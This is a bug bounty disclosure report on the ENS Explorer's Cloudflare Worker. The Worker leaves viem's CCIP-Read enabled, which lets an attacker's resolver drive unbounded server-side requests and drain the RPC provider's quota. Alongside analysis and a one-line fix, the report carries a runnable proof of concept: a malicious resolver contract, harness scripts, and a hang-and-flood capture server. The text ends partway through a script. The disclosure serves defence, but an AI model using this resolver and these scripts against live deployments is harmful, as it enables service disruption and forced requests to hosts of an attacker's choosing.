# 92723 w a medium missing ccipread guard in the explorer s og image worker client lets an attacker controlled resolver drive unbounded server side requests exhausting the worker s rpc provider&#x20;

**Submitted on Sep 11th 2026 at 20:41:42 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92723
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Taking down the application/website

## Description

## Brief/Intro

The Explorer's Cloudflare Worker builds its viem client without disabling ERC-3668 CCIP-Read, so any name whose resolver reverts `OffchainLookup` makes the Worker fetch a URL list that the resolver author controls. Anyone can point a name they own at such a resolver. The same Worker already has a hardened fetch helper for the avatar URL on the same request, but that helper cannot see this second fetch, because it happens inside viem. A single unauthenticated `GET` therefore turns into an unbounded outbound request loop: on a local deployment of the pinned tree, one request produced 8,122 upstream RPC calls, drained a metered provider quota in full, and left a legitimate request for an unrelated name with its own calls refused.

## Vulnerability Details

### The client leaves CCIP-Read enabled

`apps/portal/src/worker/clients.ts:9-24` builds the Worker's only chain client:

```ts
export function createClient(env: Env) {
  const urls = orderedSepoliaRpcUrls(
    env.SEPOLIA_RPC_URL || DEFAULT_SEPOLIA_RPC_URL,
  )
  return createPublicClient({
    chain: sepoliaWithEns,
    transport: fallback(
      urls.map((url) => http(url, { retryCount: 2 })),
      { rank: false, retryCount: 2 },
    ),
    batch: { multicall: true },
  })
}
```

There is no `ccipRead` key and no `requestOptions`. viem's gate is a negative check, `viem@2.52.2 _esm/actions/public/call.js:166`:

```js
if (client.ccipRead !== false &&
    data?.slice(0, 10) === offchainLookupSignature &&
    to)
    return {
        data: await offchainLookup(client, { data, requestOptions, to }),
    };
```

Leaving the key unset leaves CCIP-Read on. The string `ccipRead` does not appear anywhere in the five in-scope assets:

```
$ grep -rn "ccipRead" apps/portal/src apps/manager/src workers \
      packages/transaction-manager/src packages/smart-account/src
(no output)
```

`apps/portal` resolves viem 2.52.2 (`apps/portal/node_modules/viem/package.json`).

### viem's gateway fetch has no guards, and no deadline

`viem@2.52.2 _esm/utils/ccip.js:85-141`. The loop walks every entry of the attacker-supplied array and issues a bare `fetch`:

```js
export async function ccipRequest({ data, requestOptions, sender, urls, }) {
    let error = new Error('An unknown error occurred.');
    for (let i = 0; i < urls.length; i++) {
        ...
        const url = urls[i];
        const method = url.includes('{data}') ? 'GET' : 'POST';
        ...
        const response = await fetch(url.replace('{sender}', sender.toLowerCase()).replace('{data}', data), {
            body: JSON.stringify(body),
            headers,
            method,
            ...(requestOptions?.signal ? { signal: requestOptions.signal } : {}),
        });
```

Three properties matter. There is no scheme check, no IP-literal check and no `redirect: 'manual'`. The abort signal is applied only when `requestOptions` supplies one, and the Worker supplies none, so this fetch has no timeout at all. And a response that is not `ok`, or not hex, does not end the loop — viem records the error and continues to the next URL, so the number of outbound requests in one invocation equals the length of the array the attacker put in their contract.

### The path is reachable by an unauthenticated request

Two routes reach it, neither requiring a wallet, an account, or any prior interaction:

* `apps/portal/src/worker.ts:169` — `GET /og/<name>.png` calls `fetchEnsData(env, nameParts[0], new URL(request.url).host)`
* `apps/portal/src/worker.ts:252` — `GET /<name>` calls `fetchEnsData(env, decodedName, url.host)` inside a `Promise.all`, so the HTML response waits on it

Both land in `apps/portal/src/worker/ens.ts:140-146`:

```ts
const client = createClient(env)
try {
  const [records, owner] = await Promise.all([
    getRecords(client, {
      name,
      texts: ['avatar', 'description'],
    }).catch(() => null),
```

The OG route is what link unfurlers hit, so a victim does not have to visit anything: posting the link is enough to make the Worker resolve the name.

### The asymmetry with the avatar fetch

`apps/portal/src/worker/safe-fetch.ts` exists precisely because this Worker dereferences attacker-controlled URLs. Its URL check, `:74-93`:

```ts
function checkFetchableUrl(
  raw: string,
  selfHost?: string,
): UrlRejection | null {
  let url: URL
  try {
    url = new URL(raw)
  } catch {
    return 'malformed'
  }

  if (url.protocol !== 'https:') return 'scheme'
  if (url.username || url.password) return 'credentials'
  if (isIpLiteral(url.hostname)) return 'ip-literal'
  if (selfHost && url.host.toLowerCase() === selfHost.toLowerCase()) {
    return 'self-host'
  }

  return null
}
```

plus a shared deadline at `:208` (`AbortSignal.timeout(timeoutMs)`, default `20_000` at `:29`), manual redirects re-validated per hop at `:211-218` with `MAX_REDIRECTS = 3` at `:31`, and a streaming size cap at `:118`.

Every one of those applies to the avatar fetch, which is called at `ens.ts:65` with a 5 MiB cap (`ens.ts:19`). None of them applies to the CCIP gateway fetch, because the application never touches that URL — viem fetches it from inside `readContract`. The two dereferences happen on the same request, a few lines apart.

The comment the team wrote above the `selfHost` parameter describes this failure mode exactly, for the avatar:

> `selfHost` is the worker's own host: an avatar pointing back at `/og/<name>` would make the worker recurse into itself, with each hop spawning a fresh invocation.

The CCIP path has no equivalent notion, so pointing the gateway URL back at `/og/<name>.png` does what that comment warns about.

### Why this is not the published known issue R2-04

R2-04 is listed under known issues with status "fix in QA", and its text is about the **avatar text record**: the Worker resolves the requested name's avatar record and fetches it server-side with no host or IP allowlist. `safe-fetch.ts` is that fix and it is complete for the door it covers.

This report is a different dereference on the same request:

|                                | R2-04 (avatar)          | this report (CCIP gateway) |
| ------------------------------ | ----------------------- | -------------------------- |
| where the URL comes from       | an `avatar` text record | an `OffchainLookup` revert |
| what hands it to the network   | `safe-fetch.ts`         | viem, internally           |
| can the app's guards see it?   | yes                     | no                         |
| does the R2-04 patch reach it? | yes                     | no                         |

Different source, different call site, different library. The program also treats bypassing a deployed fix as a new valid bug, but this does not depend on that clause, because it is not a bypass of `safe-fetch.ts` — it is a second door the fix never covered.

### Prior art for the class

The same mechanism has a CVE in another library: **CVE-2026-40072** / **GHSA-5hr4-253g-cpx2** against web3.py, Moderate, CVSS 6.9, affecting `>= 6.0.0b3, < 7.15.0` and `8.0.0b1`, patched in 7.15.0 and 8.0.0b2. The advisory describes web3.py implementing EIP-3668 CCIP Read by making HTTP requests to contract-supplied URLs with no scheme restriction, no IP allowlist, no blocking of private or reserved ranges and no redirect validation; it notes CCIP Read defaults to enabled on all providers, and that a malicious contract can drive requests to loopback services, cloud metadata endpoints and internal networks.

That is prior art for the class, not a duplicate of this instance: different library, different codebase. It is raised here because it answers the obvious objection that this is the library's problem. The accepted remediation in that ecosystem is to disable CCIP Read in the calling application's client configuration, which is the fix recommended below. No viem security advisory exists for this, and no issue, PR or commit in this monorepo adds `ccipRead: false` or otherwise guards the gateway fetch.

## Impact Details

Selected impact: **Taking down the application/website**.

All figures below were measured on a local deployment of the pinned tree. The program's safe harbor is false, so nothing was sent to an ENS-operated system.

### One request drains the Worker's RPC quota, and the next user is refused

`SEPOLIA_RPC_URL` is a keyed provider secret, and every ENS lookup the Explorer performs depends on it. Provider tiers meter calls. Putting a quota-enforcing endpoint in front of the chain, which returns HTTP 429 over quota as a real provider does, gives:

| step                                            | result                                                   |
| ----------------------------------------------- | -------------------------------------------------------- |
| legitimate `GET /og/legit.eth.png`, fresh quota | 1 provider call, 0 refused, HTTP 200                     |
| one unauthenticated `GET /og/loop.eth.png`      | `{"used":500,"rejected":6,"quota":500,"exhausted":true}` |
| the same legitimate request, afterwards         | 6 of its RPC calls refused by the provider               |

A normal page view costs one upstream call. One attacker request costs the entire budget. After that, requests from ordinary visitors are rejected at the provider.

### The self-referential loop is unbounded

With the attacker's `urls[]` pointing back at the Worker's own `/og/` route, one request produced:

|                            | control                               | exploit                             |
| -------------------------- | ------------------------------------- | ----------------------------------- |
| attacker `urls[]` point at | a benign gateway answering in one hop | the Worker itself                   |
| `eth_call` to the provider | 2                                     | 8,122                               |
| HTTP response              | 200                                   | none returned                       |
| elapsed                    | 1 s                                   | 45 s, ended by the client's timeout |

The exact count varies between runs, and that variance is itself the point. Two consecutive runs of the identical rig under the same 45-second client timeout measured 8,122 and 3,264 `eth_call`s. Nothing in the Worker decides that number; it is a function of how many round trips the recursion completes before the client gives up, so it moves with machine load. A separate longer measurement on the same rig recorded 795 nested `/og/` invocations and 4,353 `eth_call`s, and a 90-second run reached 1,082 invocations while still climbing. The stable facts are that the control arm costs 2 calls, the exploit arm costs thousands, and nothing inside the Worker ever terminates the loop.

### Cloudflare's subrequest cap

Because `ccipRequest` walks the whole array, the attacker sets the number of outbound fetches per invocation directly. With a 1,200-entry array the Worker issued 1,200 subrequests in a single invocation. Cloudflare documents 50 subrequests per invocation on the Free plan and 10,000 on Paid, so this crosses the Free-plan cap by 24×. The array is not unlimited: the `OffchainLookup` revert must fit in a block, and against a 30,000,000 gas limit the largest array that still reverts is roughly 3,000 entries, with 4,000 returning `OutOfGas`. The Paid-plan cap of 10,000 is therefore out of reach from a single revert, and I am not claiming it. `wrangler dev` does not enforce the cap locally, so the count is measured while the cap itself is Cloudflare's, enforced in production.

### Arbitrary attacker-designated outbound requests

Independent of volume, the Worker fetches whatever host the resolver names. The captured request at the attacker's host was:

```
HIT GET /gateway/0xeeeeeeee14d718c2b47d9923deab1335e144eeee/0xac9650d8….json
```

`{sender}` is the UniversalResolver and `{data}` is the Worker's own `aggregate3` payload carrying the `avatar` and `description` queries from `ens.ts`. The URL was plain `http://` to a loopback IP literal, both of which `safe-fetch.ts` rejects outright. With an attacker host that accepts the connection and never answers, the Worker held the request for `time=60.005901s` and returned nothing, confirming there is no deadline on this path.

### Boundaries of the claim

Three things this report does not assert.

The site does not stop serving. The OG route degrades to a fallback card, so after the quota is drained a visitor gets a page with no resolved ENS data rather than an error. What stops is name resolution, which is the application's core function, not HTTP service.

Information disclosure is not reached. The SSRF is blind: `ccipRequest` discards the response unless it is hex, a Worker has no filesystem, and the only environment value that reaches a response body is the public VAPID key.

An earlier draft of this research claimed memory exhaustion killing the isolate. It does not reproduce and is withdrawn. A 2,048 MiB plain stream returned HTTP 200 in 1.29 s and a 4,096 MiB gzip bomb expanded from 32 bytes on the wire returned 200 in 0.24 s, with workerd RSS flat near 9.9 MB and every co-resident probe returning 200. The impact above rests on the amplification and quota measurements instead.

### Suggested fix

Disable CCIP-Read on the Worker's client:

```diff
   return createPublicClient({
     chain: sepoliaWithEns,
     transport: fallback(
       urls.map((url) => http(url, { retryCount: 2 })),
       { rank: false, retryCount: 2 },
     ),
     batch: { multicall: true },
+    ccipRead: false,
   })
```

If offchain resolution is genuinely needed for OG and SSR metadata, supply a `ccipRead.request` implementation that routes the gateway call through `safe-fetch.ts`, so it inherits the scheme check, the IP-literal check, the self-host check, the shared deadline and the size cap that the avatar fetch already has.

One related note: `clients.ts` wraps the primary RPC in viem's `fallback()` with two shared public endpoints (`packages/indexer/chain.ts:24-29`). When the keyed primary is drained, resolution shifts onto those public endpoints. The file's own comment on one of them — Tenderly over 1rpc.io — notes that "1rpc's free tier rate-limits quickly, which makes it a weak failover exactly when the primary is struggling". The fallback moves the load rather than bounding it.

## References

* `apps/portal/src/worker/clients.ts:9-24` — `createPublicClient` with no `ccipRead` and no `requestOptions`
* `apps/portal/src/worker.ts:169` and `:252` — the two unauthenticated entry points
* `apps/portal/src/worker/ens.ts:140-146` — `getRecords` into viem; `:65` and `:19` — the guarded avatar fetch and its 5 MiB cap
* `apps/portal/src/worker/safe-fetch.ts:74-93` — the URL guard; `:29`, `:31`, `:118`, `:208`, `:211-218` — timeout, redirect cap, size cap, shared signal, manual redirects
* `packages/indexer/chain.ts:24-29` — the shared public RPC fallbacks
* `viem@2.52.2 _esm/actions/public/call.js:166` — the `client.ccipRead !== false` gate
* `viem@2.52.2 _esm/utils/ccip.js:85-141` — the loop over `urls[]` and the unguarded `fetch`
* ERC-3668 (EIP-3668), CCIP Read: <https://eips.ethereum.org/EIPS/eip-3668>
* GHSA-5hr4-253g-cpx2 / CVE-2026-40072, the same mechanism in web3.py: <https://github.com/advisories/GHSA-5hr4-253g-cpx2>
* Cloudflare Workers platform limits, subrequests: <https://developers.cloudflare.com/workers/platform/limits/>

### Commit reconciliation

The audited revision is `63772fd872af472ced58b009499355f3430c2a86`. This report cites line numbers from `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, the head of the competition export. They are the same source tree: the export's root commit `cda79ac` is titled "fork ensdomains/apps-monorepo at 63772fd872af472ced58b009499355f3430c2a86", and `git diff --stat cda79ac 1c9b47f` touches four files — three `package.json` and `pnpm-lock.yaml` — with zero source files changed. Every file cited above is byte-identical across the two revisions.

## Proof of Concept

## Proof of Concept

Two arms, run against a local deployment. The Worker is the pinned tree, built with `vite` and run under `wrangler dev` (workerd); `clients.ts`, `worker.ts`, `ens.ts` and `safe-fetch.ts` execute unmodified, and viem's `ccipRequest` is the real one from the pinned lockfile. Nothing on the vulnerable path is reconstructed.

Because the program's safe harbor is false, the chain is local: anvil at Sepolia's chain id, carrying an attacker-controlled resolver, a model of the UniversalResolver's ERC-3668 wildcard pass-through installed at `0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe` (the address the Worker's own chain config targets), and Multicall3 at `0xca11bde05977b3631167028862be2a173976ca11` (required because `clients.ts` sets `batch: { multicall: true }`). The UR model is faithful in the one property this depends on: it catches the resolver's `OffchainLookup` and re-reverts with `sender` set to itself and the resolver's `urls[]` carried through verbatim. The cheapest way to check that assumption against production is to confirm the deployed UniversalResolver forwards a resolver's `urls[]` unchanged.

### Prerequisites

* the repo checked out at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, `pnpm install --frozen-lockfile`
* Foundry (`anvil`, `cast`, `forge`), Node, pnpm

### Arm 1 — the Worker fetches an attacker-designated URL, with no bound and no timeout

1. Start `anvil --port 8555 --chain-id 11155111`. The chain id matters: viem rejects a mismatched chain, and the client then fails over instead of exercising this path.
2. Deploy a resolver that reverts `OffchainLookup(address(this), urls, data, selector, "")` with `urls` set to a single entry pointing back at the Worker's own OG route, including a `{data}` placeholder: `http://127.0.0.1:8961/og/loop.eth.png?d={data}`. The placeholder makes viem choose `GET` (`ccip.js:91`).
3. Deploy the UniversalResolver pass-through model and Multicall3, then install them at the two addresses above with `anvil_setCode`.
4. Write `.dev.vars` in `apps/portal` with `SEPOLIA_RPC_URL="http://127.0.0.1:8555"`, run `pnpm exec vite build`, and start `wrangler dev -c dist/portal_app/wrangler.json --port 8961`.
5. Record anvil's `eth_call` count, then issue one unauthenticated request: `curl --max-time 45 http://127.0.0.1:8961/og/loop.eth.png`.
6. Record the count again.

Result: 8,122 `eth_call`s from that one request, no HTTP response, cut off at 45 seconds by the client rather than by anything in the Worker.

Control: repeat with the resolver's `urls` pointing at a benign local gateway that returns a valid hex payload in one hop, instead of at the Worker. That is the only value changed. Result: 2 `eth_call`s, HTTP 200, 1 second.

Two supporting measurements on the same rig. Pointing `urls` at a host that accepts the connection and never responds gives `worker http=000 time=60.005901s`, showing no Worker-side deadline. Pointing `urls` at a logging gateway captures `HIT GET /gateway/0xeeeeeeee14d718c2b47d9923deab1335e144eeee/0xac9650d8….json` arriving at the attacker's host over plain `http://` to a loopback IP literal.

### Arm 2 — one request exhausts the RPC quota and a legitimate user is refused

1. Same chain setup, but put a small proxy between the Worker and anvil that counts JSON-RPC requests and returns HTTP 429 once a quota is reached. Set the quota to 500 and point `SEPOLIA_RPC_URL` at the proxy.
2. Build the attacker's resolver so that only the name under attack (`loop.eth`) fans out; every other name resolves normally and cheaply. This is what makes the next step a genuinely legitimate request.
3. Reset the quota counter, then issue `GET /og/legit.eth.png` and read the proxy's counters. Baseline: 1 provider call, 0 refused, HTTP 200.
4. Reset the counter, then issue one `GET /og/loop.eth.png`. Read the counters: `{"used":500,"rejected":6,"quota":500,"exhausted":true}`.
5. Issue `GET /og/legit.eth.png` again and read the counters. Six of that request's RPC calls are refused by the provider.

### Arm 3 — subrequests per invocation

1. Deploy the attacker's resolver with an `urls[]` array of 1,200 distinct entries, all pointing at a local host that answers HTTP 200 with a non-hex body, so `ccipRequest` treats each as malformed and continues to the next.
2. Issue one `GET /og/fan.eth.png`.
3. Count the hits at that host: 1,200, from a single Worker invocation.

Cloudflare documents 50 subrequests per invocation on the Free plan, so this exceeds it by 24×. Raising the array size further is limited by block gas: about 3,000 entries still revert successfully against a 30,000,000 gas limit, and 4,000 returns `OutOfGas`, so the Paid-plan cap of 10,000 is not reachable from one revert.

### Confirming the fix closes it

Apply the one-line change from the Suggested fix section to `apps/portal/src/worker/clients.ts`, rebuild the Worker, and re-run Arm 1 unchanged. The amplification indicator goes from 1 to 0, and the control arm still returns HTTP 200 with 2 `eth_call`s, which distinguishes a working fix from a broken build. Rebuilding matters: a cached `dist/` would silently run the unpatched bundle and make the comparison meaningless.

***

### Full source of the proof of concept

Every file used above, verbatim. Layout:

```
poc/
  foundry.toml
  run.sh                 <- Arm 1 (self-recursion) and its control
  benign-gateway.mjs     <- the control arm's well-behaved gateway
  capture.mjs            <- the logging / never-responding attacker host
  src/Ccip.sol
  src/Multicall3.sol
  limits/
    run.sh               <- Arm 2 (RPC quota) and Arm 3 (subrequests)
    sink.mjs
    quota-proxy.mjs
    src/Fanout.sol
    src/Multicall3.sol   <- copy of the file above
```

`run.sh` resolves the app as `$HERE/../../../repos/audit-comp-ens/apps/portal`; adjust `PORTAL` if you place the directory elsewhere.

#### Arm 1 and its supporting measurements

`foundry.toml`:

```toml
[profile.default]
src = "src"
out = "out"
libs = []
```

`run.sh`:

```bash
#!/usr/bin/env bash
# H-C7-6 — one arm of the PoC.  Arg: exploit | control
#
# Nothing on the vulnerable path is reconstructed. The worker is the pinned tree built by
# vite and run under wrangler dev (workerd). The chain is anvil at Sepolia's chain id with:
#   - a resolver THE ATTACKER CONTROLS, reverting ERC-3668 OffchainLookup with its own urls[]
#   - a faithful model of the UniversalResolver's wildcard pass-through, installed at the
#     exact address the worker's own client targets
#   - Multicall3, because clients.ts sets `batch: { multicall: true }`
#
# The two arms differ by EXACTLY ONE value: where the attacker's urls[] point.
#   exploit -> back at the worker's own /og/ route   (the missing selfHost guard)
#   control -> at a benign external gateway that answers correctly
set -uo pipefail
MODE="${1:-exploit}"
HERE="$(cd "$(dirname "$0")" && pwd -P)"
PORTAL="$HERE/../../../repos/audit-comp-ens/apps/portal"
RPC=http://127.0.0.1:8555
WORKER_PORT=8961
GW_PORT=9099
K=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
ANVIL_LOG=/tmp/h-c7-6-anvil.log
WORKER_LOG=/tmp/h-c7-6-worker.log

cleanup() {
  pkill -f "anvil --port $RPC" 2>/dev/null
  pkill -f "anvil --port 8555" 2>/dev/null
  pkill -f "wrangler dev -c dist/portal_app" 2>/dev/null
  pkill -f "benign-gateway.mjs" 2>/dev/null
  rm -f "$PORTAL/.dev.vars"
}
trap cleanup EXIT
cleanup; sleep 1

# ---- chain -----------------------------------------------------------------
nohup anvil --port 8555 --chain-id 11155111 > "$ANVIL_LOG" 2>&1 &
for _ in $(seq 1 30); do cast chain-id --rpc-url $RPC >/dev/null 2>&1 && break; sleep 1; done

if [ "$MODE" = "exploit" ]; then
  URLS="[\"http://127.0.0.1:${WORKER_PORT}/og/loop.eth.png?d={data}\"]"
else
  nohup node "$HERE/benign-gateway.mjs" > /tmp/h-c7-6-gw.log 2>&1 &
  sleep 1
  URLS="[\"http://127.0.0.1:${GW_PORT}/gateway/{sender}/{data}.json\"]"
fi

cd "$HERE"
forge build >/dev/null 2>&1
RES=$(forge create src/Ccip.sol:MaliciousResolver --rpc-url $RPC --private-key $K --broadcast \
      --constructor-args "$URLS" 2>&1 | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
UR=$(forge create src/Ccip.sol:MockUniversalResolver --rpc-url $RPC --private-key $K --broadcast \
      --constructor-args "$RES" 2>&1 | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
MC=$(forge create src/Multicall3.sol:Multicall3 --rpc-url $RPC --private-key $K --broadcast 2>&1 \
      | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
cast rpc anvil_setCode 0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe "$(cast code "$UR" --rpc-url $RPC)" --rpc-url $RPC >/dev/null 2>&1
cast rpc anvil_setCode 0xca11bde05977b3631167028862be2a173976ca11 "$(cast code "$MC" --rpc-url $RPC)" --rpc-url $RPC >/dev/null 2>&1

# ---- the worker, from the pinned tree --------------------------------------
printf 'SEPOLIA_RPC_URL="%s"\n' "$RPC" > "$PORTAL/.dev.vars"
cd "$PORTAL"
# ALWAYS rebuild. The fix-patch differential edits clients.ts, and a cached dist/ would
# silently run the UNPATCHED bundle — which makes the differential meaningless either way.
pnpm exec vite build >/dev/null 2>&1
nohup pnpm exec wrangler dev -c dist/portal_app/wrangler.json --port $WORKER_PORT --ip 127.0.0.1 > "$WORKER_LOG" 2>&1 &
for _ in $(seq 1 40); do curl -s -o /dev/null --max-time 3 "http://127.0.0.1:${WORKER_PORT}/" && break; sleep 3; done

# ---- one unauthenticated request -------------------------------------------
: > "$WORKER_LOG.arm"
RPC_BEFORE=$(grep -c "eth_call" "$ANVIL_LOG" 2>/dev/null); RPC_BEFORE=${RPC_BEFORE:-0}
START=$(date +%s)
HTTP=$(curl -s -o /dev/null -w '%{http_code}' --max-time 45 "http://127.0.0.1:${WORKER_PORT}/og/loop.eth.png" 2>/dev/null)
ELAPSED=$(( $(date +%s) - START ))
sleep 3
RPC_AFTER=$(grep -c "eth_call" "$ANVIL_LOG" 2>/dev/null); RPC_AFTER=${RPC_AFTER:-0}

echo "mode: $MODE"
echo "attacker_urls_point_at_worker: $([ "$MODE" = exploit ] && echo 1 || echo 0)"
echo "worker_http_status: ${HTTP:-000}"
echo "elapsed_seconds: $ELAPSED"
CALLS=$((RPC_AFTER - RPC_BEFORE))
echo "eth_call_requests_to_provider: $CALLS"
# Deterministic impact key: a single resolution needs a couple of calls; anything in the
# hundreds is the recursion running unbounded.
if [ "$CALLS" -gt 100 ]; then echo "unbounded_amplification: 1"; else echo "unbounded_amplification: 0"; fi
# The upstream RPC count is read from anvil's own log, which flushes per request.
# (Worker-side invocation counts are NOT reported: wrangler buffers its request log and the
# harness tears the process down mid-flight, so that number is not trustworthy here.)
echo "worker_side_bound: 0"
echo "impact_row: 37"
```

`src/Ccip.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// A resolver the ATTACKER controls. Anyone can deploy one and point a name at it.
/// It reverts ERC-3668 OffchainLookup with an arbitrary urls[] — the attacker's own host.
contract MaliciousResolver {
    error OffchainLookup(
        address sender,
        string[] urls,
        bytes callData,
        bytes4 callbackFunction,
        bytes extraData
    );

    string[] private _urls;

    constructor(string[] memory urls_) {
        _urls = urls_;
    }

    function getUrls() external view returns (string[] memory) {
        return _urls;
    }

    function resolve(bytes calldata, bytes calldata data) external view returns (bytes memory) {
        revert OffchainLookup(address(this), _urls, data, this.resolveCallback.selector, "");
    }

    function resolveCallback(bytes calldata response, bytes calldata)
        external pure returns (bytes memory) { return response; }

    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

/// A faithful model of the ERC-3668 WILDCARD PASS-THROUGH in the UniversalResolver:
/// call the resolver, catch its OffchainLookup, and RE-REVERT with sender = this
/// and the resolver's urls[] carried through VERBATIM.
contract MockUniversalResolver {
    error OffchainLookup(
        address sender,
        string[] urls,
        bytes callData,
        bytes4 callbackFunction,
        bytes extraData
    );

    address public immutable resolverAddr;

    constructor(address r) { resolverAddr = r; }

    function _passThrough(bytes calldata name, bytes calldata data) private view {
        (bool ok, bytes memory ret) =
            resolverAddr.staticcall(abi.encodeWithSignature("resolve(bytes,bytes)", name, data));
        require(!ok, "expected OffchainLookup");
        // strip the 4-byte selector, decode the resolver's own OffchainLookup payload
        bytes memory payload = new bytes(ret.length - 4);
        for (uint256 i = 0; i < payload.length; i++) payload[i] = ret[i + 4];
        (, string[] memory urls, bytes memory cd, bytes4 cb, bytes memory extra) =
            abi.decode(payload, (address, string[], bytes, bytes4, bytes));
        // re-revert as the UR does: sender becomes THIS, urls are carried through unchanged
        revert OffchainLookup(address(this), urls, cd, cb, extra);
    }

    function resolve(bytes calldata name, bytes calldata data)
        external view returns (bytes memory, address) { _passThrough(name, data); }

    function resolveWithGateways(bytes calldata name, bytes calldata data, string[] calldata)
        external view returns (bytes memory, address) { _passThrough(name, data); }

    function resolveCallback(bytes calldata response, bytes calldata)
        external pure returns (bytes memory, address) { return (response, address(0)); }
}
```

`src/Multicall3.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// Minimal Multicall3.aggregate3 — enough for viem's `batch: { multicall: true }`.
/// NOTE allowFailure semantics are deliberately faithful: a reverting inner call is
/// returned as success=false WITH its revert data, which is what decides whether an
/// inner OffchainLookup survives batching.
contract Multicall3 {
    struct Call3 { address target; bool allowFailure; bytes callData; }
    struct Result { bool success; bytes returnData; }

    function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData) {
        uint256 length = calls.length;
        returnData = new Result[](length);
        for (uint256 i = 0; i < length; i++) {
            Result memory result = returnData[i];
            Call3 calldata calli = calls[i];
            (result.success, result.returnData) = calli.target.call(calli.callData);
            if (!(calli.allowFailure || result.success)) revert("Multicall3: call failed");
        }
    }
}
```

`benign-gateway.mjs`:

```js
// Control arm: a well-behaved CCIP gateway. Answers immediately with a valid hex payload,
// so resolution completes in ONE hop and nothing recurses.
import http from 'node:http'
http.createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'application/json' })
  res.end(JSON.stringify({ data: '0x' + '00'.repeat(32) }))
}).listen(9099, '127.0.0.1', () => console.log('benign gateway on 9099'))
```

`capture.mjs`:

```js
// Attacker-designated host. Logs every request the WORKER makes to it.
import http from 'node:http'
import { appendFileSync, writeFileSync } from 'node:fs'
const OUT = process.env.CAPTURE_OUT ?? '/tmp/h-c7-6-capture.txt'
const MODE = process.env.CAPTURE_MODE ?? 'hang'
writeFileSync(OUT, '')
let n = 0
http.createServer((req, res) => {
  n++
  appendFileSync(OUT, `HIT ${n} ${req.method} ${req.url} ua=${req.headers['user-agent'] ?? '-'}\n`)
  if (MODE === 'hang') return                        // never respond: proves no timeout
  if (MODE === 'flood') {                            // proves no size cap
    res.writeHead(200, { 'content-type': 'application/json' })
    const chunk = Buffer.alloc(1 << 20, 0x41)
    let sent = 0
    const pump = () => {
      while (sent < 4096) { if (!res.write(chunk)) { sent++; return res.once('drain', pump) } sent++ }
      res.end()
    }
    return pump()
  }
  res.writeHead(200, { 'content-type': 'application/json' })
  res.end(JSON.stringify({ data: '0x' }))
}).listen(9099, '127.0.0.1', () => console.log('capture server on 9099 mode=' + MODE))
```

#### Arms 2 and 3

`limits/src/Multicall3.sol` is a copy of `src/Multicall3.sol` above.

`limits/run.sh`:

```bash
#!/usr/bin/env bash
# H-C7-6 LIMITS — cross a PRODUCTION Worker/RPC resource limit, rather than just report a
# large number.
#
# ARM 1 "subrequest": the attacker's resolver returns an urls[] of length N. viem's
#   ccipRequest loops the WHOLE array, so the Worker makes N outbound fetches in ONE
#   invocation. Cloudflare documents 50 subrequests per invocation (Free) and 10,000
#   (Paid). N is chosen by the attacker, in their own contract; block gas caps it near 3,000.
#
# ARM 2 "quota": the Worker's SEPOLIA_RPC_URL points at an RPC endpoint with a QUOTA, as
#   every keyed provider tier has. One attacker request drains it, and then a LEGITIMATE
#   request for an unrelated name is measured — that is the takedown, observed rather
#   than inferred.
set -uo pipefail
ARM="${1:-subrequest}"
HERE="$(cd "$(dirname "$0")" && pwd -P)"
PORTAL="$HERE/../../../repos/audit-comp-ens/apps/portal"
ANVIL=http://127.0.0.1:8555
PROXY=http://127.0.0.1:9222
SINK=http://127.0.0.1:9111
WORKER_PORT=8962
K=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
N_URLS="${N_URLS:-1200}"     # 24x Cloudflare's 50-per-invocation Free cap
QUOTA="${QUOTA:-500}"
ANVIL_LOG=/tmp/h-c7-6-lim-anvil.log
WORKER_LOG=/tmp/h-c7-6-lim-worker.log

cleanup() {
  pkill -f "anvil --port 8555" 2>/dev/null
  pkill -f "wrangler dev -c dist/portal_app" 2>/dev/null
  pkill -f "sink.mjs" 2>/dev/null
  pkill -f "quota-proxy.mjs" 2>/dev/null
  rm -f "$PORTAL/.dev.vars"
}
trap cleanup EXIT
cleanup; sleep 1

nohup anvil --port 8555 --chain-id 11155111 > "$ANVIL_LOG" 2>&1 &
for _ in $(seq 1 30); do cast chain-id --rpc-url $ANVIL >/dev/null 2>&1 && break; sleep 1; done
nohup node "$HERE/sink.mjs" > /tmp/h-c7-6-lim-sink.log 2>&1 &
UPSTREAM=$ANVIL QUOTA=$QUOTA nohup node "$HERE/quota-proxy.mjs" > /tmp/h-c7-6-lim-proxy.log 2>&1 &
sleep 1

cd "$HERE"
forge build >/dev/null 2>&1

if [ "$ARM" = "subrequest" ]; then
  BASE="http://127.0.0.1:9111/g"     # N distinct urls at the attacker's host
else
  BASE="http://127.0.0.1:${WORKER_PORT}/og/loop.eth.png?d="   # self-referential
  N_URLS=1
fi

RES=$(forge create src/Fanout.sol:FanoutResolver --rpc-url $ANVIL --private-key $K --broadcast \
      --constructor-args "$BASE" "$N_URLS" 2>&1 | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
# DNS wire format of the name under attack
if [ "$ARM" = "subrequest" ]; then ATTACK_DNS=0x0366616e0365746800; else ATTACK_DNS=0x046c6f6f700365746800; fi
UR=$(forge create src/Fanout.sol:PassThroughUR --rpc-url $ANVIL --private-key $K --broadcast \
      --constructor-args "$RES" "$ATTACK_DNS" 2>&1 | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
